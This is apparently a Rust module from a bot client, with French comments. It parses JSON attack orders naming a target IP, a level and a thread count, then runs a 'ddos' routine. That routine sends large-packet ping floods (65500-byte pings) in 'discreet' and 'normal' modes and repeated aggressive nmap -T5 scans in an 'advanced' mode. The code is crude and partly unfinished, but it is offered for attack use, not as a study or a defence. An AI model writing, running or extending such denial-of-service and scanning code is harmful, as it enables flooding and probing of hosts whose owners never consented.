use std::process::Command;
use std::thread;
use serde::{Deserialize, Serialize};
use crate::function_utils::subprocess_run;
use crate::function_utils;


// a copier coller pour le json
#[derive(Serialize, Deserialize)]
struct DataReceived {
    id: String,
    attack: String,
    cible: String,
    level:String,
    threads:u32
}
fn receive_data_json_to_str(data: String) -> DataReceived {
    let p = serde_json::from_str::<DataReceived>(&data).expect("Erreur JSON");
    p
}
#[derive(Serialize, Deserialize)]
struct DataSend {
    id: u32,
    attack: String,
    ipup: Vec<String>
}
fn send_json_data(ips:Vec<String>, received:DataReceived){

    let mut data = DataSend {
        id: 0, // Remplacez par la valeur appropriée
        attack: String::new(), // Remplacez par la valeur appropriée
        ipup: Vec::new(),
    };

    //data.id = received.id;
    //data.attack = received.attack;
    //data.ipup = ips;

    let json_string = serde_json::to_string(&data);

    println!("Serialized JSON: {:?}", json_string)
}

// a copier coller pour le json


pub(crate) fn ping(ip: String){
    let cmd= format!("ping {} -l 65500",ip);

    let sortie = subprocess_run(&*cmd);
}

pub(crate) fn check_ip(ip: String) -> bool {
    let mut ip_split = ip.split(".");
    let mut ip_split_vec_int: Vec<u32> = Vec::new();

    for i in ip_split {
        if let Ok(num) = i.parse::<u32>() {
            if num >= 0 && num <= 254 {
                ip_split_vec_int.push(num);
            } else {
                return false; // Si un numéro est en dehors de la plage, l'IP n'est pas valide
            }
        } else {
            return false; // Si la conversion échoue, l'IP n'est pas valide
        }
    }

    if ip_split_vec_int.len() == 4 {
        return true;
    }

    false
}

pub(crate) fn ddos(ordre:String){

    let data = receive_data_json_to_str(ordre);
    let ip = check_ip(data.cible.clone());
    if ip == false {
        println!("L'ip n'est pas correcte");
        return;
    }else if ip == true {

        println!("Lancement de l'attaque {} niveau {} sur {} avec {} threads.", data.attack, data.level, data.cible, data.threads);

        if data.level == "1" {
            //MODE : discret
            for i in 0..data.threads {
                let cmd = format!("ping {} -n 10 -l 65500", data.cible.clone());
                let sortie = subprocess_run(&*cmd);
                thread::sleep(std::time::Duration::from_millis(20000));
            }
            println!("Fin de l'attaque.")

        }else if data.level == "2" {
            //MODE : normal
            for i in 0..data.threads {
                let cmd = format!("ping {} -l 65500", data.cible.clone());
                let sortie = subprocess_run(&*cmd);
            }
            println!("Fin de l'attaque.")
        }else if data.level == "3" {
            //MODE : avancé
            for i in 0..data.threads {
                let output = Command::new("nmap")
                    .arg("-T5")
                    .arg(data.cible.clone())
                    .output()
                    .expect("failed to execute process");
            }
            println!("Fin de l'attaque.")
        }
    }else {
        println!("Erreur");
    }



}


